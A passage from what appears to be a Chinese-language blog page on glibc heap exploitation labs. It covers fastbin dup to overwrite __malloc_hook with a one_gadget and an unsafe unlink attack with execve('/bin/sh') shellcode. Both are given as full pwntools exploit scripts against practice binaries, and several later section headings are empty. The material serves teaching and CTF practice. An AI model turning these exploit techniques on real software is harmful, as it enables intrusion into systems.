class="hljs-number">0x58</span> &amp;&amp; (n &lt;= <span class="hljs-number">0x68</span> || n &gt; <span class="hljs-number">0x78</span>) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;fast chunks only (excluding 0x70)&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          m_array[index] = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(n);<br>          <span class="hljs-keyword">if</span> ( m_array[index] )<br>          &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data: &quot;</span>);<br>            read(<span class="hljs-number">0</span>, m_array[index++], n);<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;request failed&quot;</span>);<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h5 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul>
+<li><p>两次fastbin dup，伪造一个size字段以及一个fd字段</p>
+<p><img src="Heap.assets/image-20220821113749445.png" srcset="/img/loading.gif" lazyload alt="image-20220821113749445"></p>
+</li>
+<li><p>继续malloc，将top chunk的地址覆盖，为了方便观看我们将其修改为0xdeadbeef</p>
+<p><img src="Heap.assets/image-20220821114003739.png" srcset="/img/loading.gif" lazyload alt="image-20220821114003739"></p>
+<p>为了满足一个对size字段的检查，我们还是用<code>__malloc_hook - 35</code>来覆盖top_chunk的地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">--- a/<span class="hljs-built_in">malloc</span>/<span class="hljs-built_in">malloc</span>.c<br>+++ b/<span class="hljs-built_in">malloc</span>/<span class="hljs-built_in">malloc</span>.c<br>@@ <span class="hljs-number">-4076</span>,<span class="hljs-number">6</span> +<span class="hljs-number">4076</span>,<span class="hljs-number">9</span> @@ _int_malloc (mstate av, <span class="hljs-type">size_t</span> bytes)<br>       victim = av-&gt;top;<br>       size = chunksize (victim);<br> <br>+      <span class="hljs-keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))<br>+        malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted top size&quot;</span>);<br>+<br>       <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>         &#123;<br>           remainder_size = size - nb;<br></code></pre></td></tr></table></figure></li>
+<li><p>继续malloc，使用one_gadget来覆盖<code>__malloc_hook</code>，为了方便观察，我们仍然使用0xdeadbeef来代替</p>
+<p><img src="Heap.assets/image-20220821115406447.png" srcset="/img/loading.gif" lazyload alt="image-20220821115406447"></p>
+<p>继续malloc，观察是否满足one_gadget的条件</p>
+<p><img src="Heap.assets/image-20220821115524129.png" srcset="/img/loading.gif" lazyload alt="image-20220821115524129"></p>
+<p>此时的寄存器状态</p>
+<p><img src="Heap.assets/image-20220821115602029.png" srcset="/img/loading.gif" lazyload alt="image-20220821115602029"></p>
+<p>此时的栈帧状态</p>
+<p><img src="Heap.assets/image-20220821115655834.png" srcset="/img/loading.gif" lazyload alt="stck"></p>
+<p>可以观察到并不满足任何一个one_gadget的地址，但是我们看到第三个one_gadget，只要求rsp+0x50的位置所存的值为0即可，此时的值我们发现是可以有我们自己控制的，遂修改即可。</p>
+</li>
+<li><p>drop a shell</p>
+<p><img src="Heap.assets/image-20220821120333916.png" srcset="/img/loading.gif" lazyload alt="image-20220821120333916"></p>
+</li>
+</ul>
+<h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = context.binary = ELF(<span class="hljs-string">&quot;fastbin_dup_2&quot;</span>)<br>libc = ELF(elf.runpath + <span class="hljs-string">b&quot;/libc.so.6&quot;</span>) <span class="hljs-comment"># elf.libc broke again</span><br><br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript=gs)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br><span class="hljs-comment"># Index of allocated chunks.</span><br>index = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># Select the &quot;malloc&quot; option; send size &amp; data.</span><br><span class="hljs-comment"># Returns chunk index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size, data</span>):<br>    <span class="hljs-keyword">global</span> index<br>    io.send(<span class="hljs-string">b&quot;1&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;size: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;size&#125;</span>&quot;</span>.encode())<br>    io.sendafter(<span class="hljs-string">b&quot;data: &quot;</span>, data)<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>    index += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> index - <span class="hljs-number">1</span><br><br><span class="hljs-comment"># Select the &quot;free&quot; option; send index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.send(<span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br>io = start()<br><br><span class="hljs-comment"># This binary leaks the address of puts(), use it to resolve the libc load address.</span><br>io.recvuntil(<span class="hljs-string">b&quot;puts() @ &quot;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>) - libc.sym.puts<br>io.timeout = <span class="hljs-number">0.1</span><br><br><span class="hljs-comment"># =============================================================================</span><br><br><span class="hljs-comment"># =-=-=- EXAMPLE -=-=-=</span><br><br><span class="hljs-comment"># Request two 0x50-sized chunks.</span><br>chunk_A = malloc(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">8</span>)<br>chunk_B = malloc(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&quot;B&quot;</span>*<span class="hljs-number">8</span>)<br><br><span class="hljs-comment"># Free the first chunk, then the second.</span><br>free(chunk_A)<br>free(chunk_B)<br>free(chunk_A)<br><br>malloc(<span class="hljs-number">0x48</span>, p64(<span class="hljs-number">0x61</span>))<br>malloc(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&quot;C&quot;</span>*<span class="hljs-number">0x48</span>)<br>malloc(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&quot;D&quot;</span>*<span class="hljs-number">0x48</span>)<br><br><span class="hljs-comment"># other fastbin dup</span><br>chunk_E = malloc(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&quot;E&quot;</span>*<span class="hljs-number">0x58</span>)<br>chunk_F = malloc(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&quot;F&quot;</span>*<span class="hljs-number">0x58</span>)<br><br>free(chunk_E)<br>free(chunk_F)<br>free(chunk_E)<br><br>malloc(<span class="hljs-number">0x58</span>, p64(libc.sym.main_arena + <span class="hljs-number">0x20</span>))<br><span class="hljs-comment"># malloc(0x58, b&quot;G&quot;*0x58)</span><br>malloc(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&quot;-s\x00&quot;</span>)<br>malloc(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&quot;H&quot;</span>*<span class="hljs-number">0x58</span>)<br><br><span class="hljs-comment"># over_write the top_chunk</span><br>malloc(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&quot;Y&quot;</span>*<span class="hljs-number">0x30</span> + p64(libc.sym.__malloc_hook - <span class="hljs-number">35</span>))<br><span class="hljs-comment"># malloc(0x58, b&quot;Y&quot;*0x30 + p64(0xdeadbeef))</span><br><br><span class="hljs-comment"># malloc fake chunk</span><br>malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;Z&quot;</span>*<span class="hljs-number">0x13</span> + p64(libc.address + <span class="hljs-number">0xe1fa1</span>))<br><span class="hljs-comment"># malloc(0x28, b&quot;Z&quot;*0x13 + p64(0xdeadbeef))</span><br><br><span class="hljs-comment"># drop a shell</span><br>malloc(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&quot;&quot;</span>)<br><br><span class="hljs-comment"># =============================================================================</span><br>io.interactive()                <br></code></pre></td></tr></table></figure>
+
+<h4 id="示例三：0CTF-2017-babyheap"><a href="#示例三：0CTF-2017-babyheap" class="headerlink" title="示例三：0CTF 2017 babyheap"></a>示例三：0CTF 2017 babyheap</h4><blockquote>
+<p>文件详见<a href="attachment%5C0ctf_2017_babyheap%5Cbabyheap">babyheap</a></p>
+</blockquote>
+<h3 id="Unsafe-Unlink"><a href="#Unsafe-Unlink" class="headerlink" title="Unsafe Unlink"></a>Unsafe Unlink</h3><h4 id="详情-2"><a href="#详情-2" class="headerlink" title="详情"></a>详情</h4><p>为了避免堆内存过度碎片化，当一个堆块（fastbin chunk 除外）被释放时，libc会查看其前后堆块是否处于被释放的状态，如果是，就将前面或后面的堆块中从bins中取出，并于当前堆块合并，这个取出的过程便是unlink。</p>
+<p>假设我们此时开辟了6个大小为0xa0的堆块：<img src="Heap.assets/image-20220903173420886.png" srcset="/img/loading.gif" lazyload alt="image-20220903173420886"></p>
+<p>此时我们释放靠近top chunk的堆块，我们会发现该堆块会和top chunk合并<img src="Heap.assets/image-20220903173447945.png" srcset="/img/loading.gif" lazyload alt="image-20220903173447945"></p>
+<p>此时我们释放第一个申请的块，我们可以看到这个块已被放入了unsortedbin，且fd,bk指针均被赋值，下一个chunk的prev_size及prev_inuse均有改变<img src="Heap.assets/image-20220903173735492.png" srcset="/img/loading.gif" lazyload alt="image-20220903173735492"></p>
+<p>此时我们再去释放临近块，我们会发现两个chunk合并成立一个chunk。</p>
+<p><img src="Heap.assets/image-20220903174353252.png" srcset="/img/loading.gif" lazyload alt="image-20220903174353252"></p>
+<p><img src="Heap.assets/image-20220903175411826.png" srcset="/img/loading.gif" lazyload alt="image-20220903175411826"></p>
+<p>在这个unlink的过程中存在着一个fd,bk的反射写入，我们此漏洞的利用同样也是根据于此：</p>
+<ul>
+<li><p>我们先创建5个大小为0x90的堆块：<img src="Heap.assets/image-20220903181246083.png" srcset="/img/loading.gif" lazyload alt="image-20220903181246083"></p>
+</li>
+<li><p>接着我们利用堆溢出来修改第三个堆块的fd, bk以及第四个堆块的prev_size，prev_inuse:<img src="Heap.assets/image-20220903182117957.png" srcset="/img/loading.gif" lazyload alt="image-20220903182117957"></p>
+</li>
+<li><p>我们继续释放第四个块，此时第四个块的prev_inuse为0，也就意味着这个堆块会向前合并。</p>
+<p><img src="Heap.assets/image-20220903182811281.png" srcset="/img/loading.gif" lazyload alt="image-20220903182811281"></p>
+</li>
+</ul>
+<p>unsafe unlink 相应代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;\</span><br><span class="hljs-meta">    FD = P-&gt;fd;\</span><br><span class="hljs-meta">    BK = P-&gt;bk;\</span><br><span class="hljs-meta">    FD-&gt;bk = BK;\</span><br><span class="hljs-meta">    BK-&gt;fd = FD;\</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (!in_smallbin_range (P-&gt;size)\</span><br><span class="hljs-meta">        &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;\</span><br><span class="hljs-meta">            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;\</span><br><span class="hljs-meta">                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)\</span><br><span class="hljs-meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;\</span><br><span class="hljs-meta">                <span class="hljs-keyword">else</span> &#123;\</span><br><span class="hljs-meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;\</span><br><span class="hljs-meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;\</span><br><span class="hljs-meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;\</span><br><span class="hljs-meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;\</span><br><span class="hljs-meta">                &#125;\</span><br><span class="hljs-meta">            &#125; <span class="hljs-keyword">else</span> &#123;\</span><br><span class="hljs-meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;\</span><br><span class="hljs-meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;\</span><br><span class="hljs-meta">            &#125;\</span><br><span class="hljs-meta">    &#125;\</span><br><span class="hljs-meta">&#125;</span><br><br></code></pre></td></tr></table></figure>
+
+<h4 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h4><p>这项技术只能在GLIBC版本&lt;=2.3.3的情况下使用，safe unlink  是在2004年GLIBC版本2.3.4中引入的，而GLIBC版本如此之老并不常见。这项技术最初是用来对付没有NX/DEP的平台的，这里也是这样描述的。2003年，AMD在他们的消费者桌面处理器中引入了硬件NX支持，随后英特尔在2004年也引入了，因此没有这种保护的系统并不常见。</p>
+<h4 id="示例一-unsafe-unlink"><a href="#示例一-unsafe-unlink" class="headerlink" title="示例一 unsafe_unlink"></a>示例一 unsafe_unlink</h4><blockquote>
+<p>文件详见 </p>
+</blockquote>
+<h5 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(fanya㉿ferity)-[~/…/heap/heaplab/part1/unsafe_unlink]<br>└─$ checksec unsafe_unlink<br>[*] <span class="hljs-string">&#x27;/home/fanya/Desktop/heap/heaplab/part1/unsafe_unlink/unsafe_unlink&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX disabled<br>    PIE:      PIE enabled<br>    RWX:      Has RWX segments<br>    RUNPATH:  <span class="hljs-string">&#x27;../.glibc/glibc_2.23_unsafe-unlink&#x27;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = context.binary = ELF(<span class="hljs-string">&quot;unsafe_unlink&quot;</span>)<br>libc = ELF(elf.runpath + <span class="hljs-string">b&quot;/libc.so.6&quot;</span>) <span class="hljs-comment"># elf.libc broke again</span><br><br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript=gs)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br><span class="hljs-comment"># Index of allocated chunks.</span><br>index = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># Select the &quot;malloc&quot; option; send size.</span><br><span class="hljs-comment"># Returns chunk index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size</span>):<br>    <span class="hljs-keyword">global</span> index<br>    io.send(<span class="hljs-string">b&quot;1&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;size: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;size&#125;</span>&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>    index += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> index - <span class="hljs-number">1</span><br><br><span class="hljs-comment"># Select the &quot;edit&quot; option; send index &amp; data.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, data</span>):<br>    io.send(<span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    io.sendafter(<span class="hljs-string">b&quot;data: &quot;</span>, data)<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br><span class="hljs-comment"># Select the &quot;free&quot; option; send index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.send(<span class="hljs-string">b&quot;3&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br>io = start()<br><br><span class="hljs-comment"># This binary leaks the address of puts(), use it to resolve the libc load address.</span><br>io.recvuntil(<span class="hljs-string">b&quot;puts() @ &quot;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>) - libc.sym.puts<br><br><span class="hljs-comment"># This binary leaks the heap start address.</span><br>io.recvuntil(<span class="hljs-string">b&quot;heap @ &quot;</span>)<br>heap = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>io.timeout = <span class="hljs-number">0.1</span><br><br><span class="hljs-comment"># =============================================================================</span><br><br><span class="hljs-comment"># Prepare execve(&quot;/bin/sh&quot;) shellcode with a jmp over where the fd will be written.</span><br>shellcode = asm(<span class="hljs-string">&quot;jmp shellcode;&quot;</span> + <span class="hljs-string">&quot;nop;&quot;</span>*<span class="hljs-number">0x16</span> + <span class="hljs-string">&quot;shellcode:&quot;</span> + shellcraft.execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br><br>chunk_A = malloc(<span class="hljs-number">0x88</span>)<br>chunk_B = malloc(<span class="hljs-number">0x88</span>)<br><br>fd = libc.sym.__free_hook - <span class="hljs-number">0x18</span><br>bk = heap + <span class="hljs-number">0x20</span><br><br>edit(chunk_A, pack(fd) + pack(bk) + shellcode.ljust(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0x90</span>)*<span class="hljs-number">2</span>)<br>free(chunk_B)<br>free(chunk_A)<br><br><span class="hljs-comment"># =============================================================================</span><br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h3 id="Safe-Unlink"><a href="#Safe-Unlink" class="headerlink" title="Safe Unlink"></a>Safe Unlink</h3><h3 id="Unsortedbin-Attack"><a href="#Unsortedbin-Attack" class="headerlink" title="Unsortedbin Attack"></a>Unsortedbin Attack</h3><h3 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h3><h3 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h3><h3 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h3><h3 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a>House of Einherjar</h3><h3 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h3><h3 id="Poison-Null-Byte"><a href="#Poison-Null-Byte" class="headerlink" title="Poison Null Byte"></a>Poison Null Byte</h3><h3 id="Tcache-Dup"><a href="#Tcache-Dup" class="headerlink" title="Tcache Dup"></a>Tcache Dup</h3><h3 id="House-of-Corrosion"><a href="#House-of-Corrosion" class="headerlink" title="House of Corrosion"></a>House of Corrosion</h3>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/09/06/Heap/Heap/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
